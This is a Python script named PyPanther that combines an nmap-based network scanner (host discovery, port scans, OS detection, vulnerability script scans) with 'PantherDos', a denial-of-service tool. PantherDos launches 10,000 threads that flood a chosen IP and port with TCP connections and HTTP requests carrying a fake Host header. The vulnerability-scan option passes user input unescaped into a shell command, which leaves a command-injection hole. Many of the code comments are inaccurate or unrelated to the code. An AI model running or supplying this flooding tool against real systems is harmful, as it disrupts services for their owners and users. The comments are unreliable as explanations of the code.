#!/usr/bin/python3
import os  # importing the OS module for Operating system based execution
import platform  # using to identify the platform
import socket  # using to create socket connection for networking
import sys  # using to connect the code with system
import nmap  # using to adv scan networks
import nmap3  # using nmap's advanced version
import threading  # handling multiple tasks
from termcolor import colored  # coloring the figlet text
from pyfiglet import figlet_format  # for echo
from time import sleep as timeout  # setting the time


def restart_program() :  # defining restart
    python = sys.executable  # making excecutable
    os.execl(python, python, *sys.argv)  # calling the path of executing file
    os.system('clear')


print(colored(figlet_format("PyPanther"), color="cyan"))  # pyfiglet takes ASCII text and renders it in ASCII art fonts.

options = input("Choose which tool you want to use! \n 1.Panther Map \n 2.Panther Dos \n Enter your choice : ")
# options - This is the string of option letters that the script wants to recognize.
if options == "1" :
    a = platform.system()
    if a == 'Windows' :
        print(os.system('cls'))
    elif a == 'Linux' :
        print(os.system('clear'))
    elif a == 'Darwin' :
        print(os.system('clear'))

    while True :  # We need to define a method here so that we can later on refer to that method in the threats and
        # We say basically an end to this loop.

        print(colored(figlet_format(" PantherMap"), color="green"))

        scanner = nmap.PortScanner()  # We all know that, what import nmap is for, to import the nmap module to our
        # python script. Then we initialise the Nmap PortScanner to scan the port on our local machine.

        print('+===================================================================+')
        print('||++++++++++++++++WELCOME TO ADVANCED NETWORK SCANNER++++++++++++++||')
        print('+===================================================================+')

        mode = input("""\nEnter the type of scan!!!
                  [1] Domain LookUp
                  [2] Whole Network Scan
                  [3] Simple Network scan
                  [4] Aggressive Scan 
                  [5] CVE Scan
                  [00] Back\nEnter your option : """)  # The input() function reads a line entered on a console.
        print("\nYou have selected option: ", mode)

        if mode == '1' :  # The mode is the set of data values that appear most often, It is the value at which the data
            # is most likely to be sampled.

            print(colored(figlet_format("  Domain LookUP"), color="blue"))

            url = input("Enter the Domain Name(ex.google.com): ")  # The <input type="url"> defines a field
            # for entering a url. The input value is automatically validated before the submission.

            print("IP :", socket.gethostbyname(url))

        elif mode == '2' :  # The elif keyword in python is a way of saying "If the previous condition were ot true,
            # then try this condition.

            a = platform.system()
            if a == 'Windows' :
                print(os.system('ipconfig'))
            elif a == 'Linux' :
                print(os.system('ifconfig'))
            elif a == 'Darwin' :
                print(os.system('ifconfig'))

            ip = input("Enter the ip (ex.192.168.1.0/24): ")

            print("PantherMap Version: ", scanner.nmap_version())
            scanner.scan(ip, arguments='-n -sP -PE -PA21 ,23,80,3389')  # Scanning the port.
            ip_list = [(x, scanner[x]['status']['state']) for x in scanner.all_hosts()]
            # Get the state of host (UP|DOWN|UNKNOWN|SKIPPED)

            for host, status in ip_list :  # Use the all Hosts Status Page to view the enforcement status of  host.
                print(host, ':', status)

        elif mode == '3' :

            a = platform.system()  # platform.system() actually runs uname and potentially several other functions to
            # determine the system type at the run time.
            if a == 'Windows' :
                print(os.system('ipconfig'))
            elif a == 'Linux' :
                print(os.system('ifconfig'))
            elif a == 'Darwin' :
                print(os.system('ifconfig'))

            ip = input("Enter the IP address (ex.192.168.1.1): ")

            print("PantherMap Version: ", scanner.nmap_version())
            scanner.scan(ip, '1-1024', arguments='-v -sS')
            for host in scanner.all_hosts() :  # Get all hosts that were scanned.
                print('Host : %s (%s)' % (ip, scanner[ip].hostname()))
                print('State : %s' % scanner[host].state())
                for proto in scanner[ip].all_protocols() :
                    print('----------')
                    print('Protocol : %s' % proto)

                    lport = scanner[ip][proto].keys()  # Enumerating,counting & listing all the open ports and 1 by 1.
                    lport = sorted(lport)
                    for port in lport :
                        print('port : %s\t%s\t%s' % (
                            port, scanner[ip][proto][port]['state'], scanner[ip][proto][port]['name']))

        elif mode == '4' :
            a = platform.system()
            if a == 'Windows' :
                print(os.system('ipconfig'))
            elif a == 'Linux' :
                print(os.system('ifconfig'))
            elif a == 'Darwin' :
                print(os.system('ifconfig'))

            ip_add = input('Enter the ip address (ex.192.168.1.1): ')
            print("PantherMap Version:", scanner.nmap_version())
            scanner.scan(ip_add, '1-1024', arguments='-A')
            nmap1 = nmap3.NmapScanTechniques()  # The way this tool works is by defining each nmap command into python,
            # function making it very easy to use sophisticated nmap commands in either python scripts.
            results = nmap1.nmap_tcp_scan(ip_add, args="-A")
            print('Host:%s(%s)' % (ip_add, scanner[ip_add].hostname()))
            print('state:%s\n' % scanner[ip_add].state())
            i = 0
            while i < len(results[ip_add]) :  # The loop iterates while the condition is true, when th condition became
                # false, program control passes to the line immediately following the loop.
                ser = results[ip_add][i]['service']
                print('port: %s\t%s\t%s\t\t\t%s |\t\t\t%s' % (
                    results[ip_add][i]['portid'], results[ip_add][i]['state'], ser.get('name', ''),
                    ser.get('product', ''),
                    ser.get('version', '')))
                i = i + 1  # i is a temporary variable used to store the value of the current position in the range of
                # the for loop that only has scope only within the loop.
            os_det = results['os']  # This module provides a portable way of using the operating system dependent fnctn.
            os_cl = os_det[0].get('osclass', '')
            print('\nOperating System: ', os_det[0].get('name', ''), '\tAccuracy: ', os_det[0].get('accuracy', ''))
            print('Vendor: ', os_cl.get('vendor', ''))
            print('OS gen: ', os_cl.get('osgen', ''), '\tAccuracy: ', os_cl.get('accuracy', ''))
            print('CPE: ', os_det[0].get('cpe', ''))

        elif mode == '5' :
            print('Note :THIS OPTION ONLY WORKS WITH KALI LINUX ')


            def vulnhunt(IP) :
                command = "nmap -script vuln -Pn " + IP
                process = os.popen(command)
                result = str(process.read())
                return result  # A return statement is used to end the execution of the function call and 'returns' the
            # result. The statements after the return statement are not  executed. If the return value is without any
            # expression, then the special value none is returned.

            print(vulnhunt(input('enter the IP here (ex.192.168.1.1):')))
        elif mode >= '6' :
            print("Error! Enter a valid option.")

        elif mode == '00' or '0' :
            restart_program()
        else :
            timeout(3)
            restart_program()  # This will restart the program in the same way as when the user clicks 'Restart' button.
            # This would most commonly used inside one of the mouse callback function.

elif options == "2" :
    os.system('clear')  # This line tells python to talk to operating system and ask the system to run the clear command
    attack_num = 0  # We created a variable attack_num, which tracks how many requests have been send already.
    # With every iteration we increases this number and print it.
    print(colored(figlet_format("PantherDos"), color="red"))
    timeout(2)

    print(
        """NOTE: If any error occurs during the execution of DDOS tool, \n please increase the value of number of open
         files in file descriptor.""")

    url = input("\nEnter the Domain Name (ex.google.com): ")
    print("IP :", socket.gethostbyname(url))

    try :
        target = str(input("Enter the target IP (ex.192.168.1.1): "))
        if not target :  # Not operator along with the if statement can be used to execute a block of condition,
            # when the condition evaluates to false.
            raise ValueError('Error! Empty String')
            #  The raise statement allows the programmer to force a specific condition to occur.
    except ValueError as e :
        restart_program()
    try :  # Try blocks lets you test a block of code for error.
        port = int(input("Enter the target port: "))
    except ValueError :  # The except block let you handle the error.
        restart_program()
    fake_ip = '10.23.12.45'


    def attack() :
        while True :
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            """Here we made a socket instance and passes two parameters, the first parameter is AF.INIT and the second 
            one is SOCK.STREAM, The AF.INIT refers to the address  family IPv4 & SOCK.STREAM means connection oriented 
             TCP Protocol."""
            s.connect((target, port))
            s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
            s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))

            global attack_num
            attack_num += 1
            print([target], [attack_num], [fake_ip])

            s.close()  # This helps to close a detached socket.


    for i in range(10000) :
        thread = threading.Thread(target=attack)
        thread.start()
        """In this case we are starting 10000 threads that will execute our function, of course you can play around with
        the number. 
          """

elif options >= '3' :
    print("Error! Enter a valid option.")
elif options == '0' :
    print("Error! Enter a valid option.")
else :
    timeout(3)
    restart_program()
